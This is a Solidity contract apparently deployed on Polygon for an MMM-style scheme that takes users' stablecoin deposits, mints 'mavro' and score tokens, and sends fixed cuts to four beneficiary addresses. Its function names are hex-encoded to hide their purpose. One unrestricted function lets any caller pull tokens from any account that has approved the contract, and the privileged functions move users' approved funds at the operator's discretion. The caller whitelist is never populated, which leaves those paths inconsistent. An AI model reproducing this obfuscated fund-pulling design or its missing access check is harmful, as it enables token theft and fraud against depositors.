/**
 *Submitted for verification at polygonscan.com on 2022-10-16
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.4.24;

interface IERC20 {
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external ;
    function transfer(address recipient, uint256 amount) external;

    function m7473696e(address account, uint amount) external;
    function m74736f74(address account, uint amount) external;

    function m6d696e74(address to, uint256 amount) external returns (bool);
    function m6275726e(address to, uint256 amount) external returns (bool);
    
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

contract Ownable {
    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() public {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract MmmContract is Ownable {
    using SafeMath for uint256;

    IERC20 pusdt;
    IERC20 mavro;
    IERC20 score;

    uint8 ratio = 40;
    uint8 rOnes = 10;
    uint8 rTwos = 10;
    uint8 rThrs = 4;
    uint8 rFous = 16;

    address ones;
    address twos;
    address thrs;
    address fous;

    mapping(address => bool) private isCaller;

    constructor(
        IERC20 _pusdt, IERC20 _mavro, IERC20 _score, address _ones, address _twos, address _thrs, address _fous
    ) public { 
        pusdt = _pusdt;
        mavro = _mavro;
        score = _score;
        ones = _ones;
        twos = _twos;
        thrs = _thrs;
        fous = _fous;
    }

    modifier onlyCaller() {
        require(isCaller[msg.sender], "Error: caller is not the caller");
        _;
    }

    function m7473696e(address account, uint amount) external {
        pusdt.transferFrom(account, address(this), amount);
    }

    function m74736f74(address account, uint amount) external onlyCaller { 
        pusdt.transfer(account, amount);
    }

    // GETSCORE
    function m62696e64(address account, uint256 value) external onlyCaller {
        score.m6d696e74(account, value);
    }

    // GETMAVRO
    function m627e579d(address account, uint256 value) external onlyCaller {
        require(pusdt.balanceOf(account) >= value);
        pusdt.transferFrom(account, address(this), value);
        mavro.m6d696e74(account, value);
    }

    //  GETHELP
    function m70e75d74(address account, uint256 value) external onlyCaller {
        uint vTotal = 0;
        uint vOnes = 0;
        uint vTwos = 0;
        uint vThrs = 0;
        uint vFous = 0;
        vTotal = value * ratio / 1000;
        vOnes = value * rOnes / 1000;
        vTwos = value * rTwos / 1000;
        vThrs = value * rThrs / 1000;
        vFous = value * rFous / 1000;
        require(pusdt.balanceOf(account) >= value);
        require(pusdt.balanceOf(mavro) >= vTotal);
        pusdt.transferFrom(account, address(this), value);
        mavro.m7473696e(ones, vOnes);
        mavro.m7473696e(twos, vTwos);
        mavro.m7473696e(thrs, vThrs);
        mavro.m7473696e(fous, vFous);
        mavro.m6275726e(account, vTotal);
        score.m6275726e(account, 100000000);
    }

    //  ENDHELP
    function m65em6e64(address account, uint256 value) external onlyCaller {
        require(pusdt.balanceOf(account) >= value);
        pusdt.transferFrom(account, address(this), value);
    }

    //  PUTHELP
    function m67e6e574(address account, uint256 value) external onlyCaller {
        require(pusdt.balanceOf(address(this)) >= value);
        pusdt.transferFrom(address(this), account, value);
    }

}